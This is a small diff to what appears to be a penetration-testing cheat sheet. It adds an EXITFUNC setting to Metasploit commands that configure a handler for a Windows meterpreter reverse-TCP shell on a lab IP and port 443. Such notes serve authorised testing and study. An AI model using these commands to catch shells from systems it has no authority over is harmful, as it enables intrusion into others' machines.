@@ -121,6 +121,7 @@ Metasploit Handler usage w/ public exploit:
 $ msfconsole
 $ msf > use exploit/multi/handler
 $ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+$ msf exploit(handler) > set EXITFUNC thread
 $ msf exploit(handler) > set LHOST 10.11.0.31
 $ msf exploit(handler) > set LPORT 443
 $ msf exploit(handler) > run
